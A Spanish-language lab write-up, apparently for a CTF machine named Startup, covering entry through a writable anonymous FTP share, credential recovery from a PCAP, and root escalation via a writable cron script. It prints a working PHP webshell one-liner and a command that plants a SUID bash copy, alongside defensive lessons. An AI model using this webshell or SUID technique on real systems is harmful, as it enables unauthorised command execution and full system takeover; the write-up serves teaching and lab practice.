# Explotación y escalada — LAB-016 Startup

## 1. FTP anónimo y directorio web compartido

La sesión anónima del servicio FTP permitía escribir dentro de `ftp/`. El mismo contenido era visible por HTTP en `/files/ftp/`, lo que permitió cargar un archivo PHP y solicitarlo desde el navegador/cliente HTTP.

La versión de webshell que produjo salida de comandos fue:

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

Al llamar el archivo con `cmd=id`, el proceso se ejecutó como `www-data`.

## 2. Captura PCAP y acceso como lennie

Desde el webshell se localizó `/incidents/suspicious.pcapng`. Se copió al directorio FTP publicado, se descargó a Parrot y se analizó con TShark. `tshark -z conv,tcp` reveló conversaciones con el puerto 4444; el flujo TCP 7 contenía una sesión de shell. En el historial del flujo se observaron credenciales de `lennie`; se omiten para no publicar secretos.

Con esas credenciales se accedió por SSH como `lennie`. La bandera de usuario se encontró en su directorio personal; su valor se omite.

## 3. Escalada a root por script de cron modificable

La inspección mostró que `/home/lennie/scripts/planner.sh` ejecutaba `/etc/print.sh`. `ls -l /etc/print.sh` confirmó que este archivo pertenecía a `lennie` y era ejecutable. Se modificó para crear una copia de Bash con SUID:

```bash
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' > /etc/print.sh
```

Después de 60 segundos, `/tmp/rootbash` apareció como archivo root-owned con modo `-rwsr-xr-x`. La ejecución:

```bash
/tmp/rootbash -p
```

conservó el UID efectivo privilegiado. `whoami` devolvió `root`, y `id` mostró `euid=0(root)`. Se confirma escalada a root. No se registra el valor de `root.txt`.

## 4. Lecciones de seguridad

- Un recurso anónimo escribible que también ejecuta contenido en el servidor equivale a un punto de entrada crítico.
- Las capturas de red pueden revelar credenciales cuando contienen protocolos o sesiones sin cifrar.
- Las tareas de root nunca deben invocar scripts modificables por una cuenta de bajo privilegio.
- Los binarios SUID requieren control estricto; automatizar su creación como root aumenta el impacto de una escritura insegura.
